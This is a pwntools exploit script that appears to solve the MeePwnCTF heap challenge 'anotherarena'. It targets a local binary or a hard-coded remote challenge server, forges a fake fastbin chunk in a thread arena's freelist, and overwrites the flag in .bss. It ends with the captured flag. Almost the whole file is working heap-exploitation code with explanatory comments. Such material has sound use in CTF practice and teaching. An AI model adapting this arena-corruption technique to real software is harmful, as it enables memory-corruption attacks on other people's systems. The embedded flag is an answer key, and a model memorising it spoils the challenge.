#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'info'
context.arch = 'amd64'
context.bits = 64
context.os = 'linux'

###

if DEBUG:
    r = process('./anotherarena')
else:
    r = remote('139.59.241.76', 31335)

GDB = False
if GDB and DEBUG:
    gdb.attach(r, '''b *0x0000000000400C85''')
# this is used as a fake size for fake fastbin to avoid memory corruption detection
r.sendline(str(0x42))
time.sleep(0.5)
# we want to fake a fastbin in the freelist in the thread arena for size 0x40
r.send(p32(-2184, signed=True))
time.sleep(0.5)
# start of our fake fastbin of size 0x40 | 2
r.send(p32(0x6020d8))

for i in xrange(7):
    r.send(p32(0))
    r.send(p32(0))
# magic value
r.send(p32(0xc0c0aff6))

# size, malloc will be called with (0x32) and rounded to 0x40
r.sendline('50')
# after 25 'A' we start rewriting the flag inside .bss, don't send any nullbyte here
r.send('A' * 30)

print r.recvall()
r.close()

# MeePwnCTF{oveRwrit3_another_(main)_arena}
